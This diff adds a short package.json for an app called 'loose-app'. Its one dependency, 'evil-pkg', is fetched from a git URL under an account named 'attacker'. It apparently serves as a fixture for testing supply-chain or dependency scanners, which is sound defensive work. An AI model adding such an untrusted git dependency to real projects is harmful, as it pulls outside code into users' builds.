@@ -1,0 +1,7 @@
+{
+  "name": "loose-app",
+  "version": "1.0.0",
+  "dependencies": {
+    "evil-pkg": "git+https://github.com/attacker/evil.git"
+  }
+}
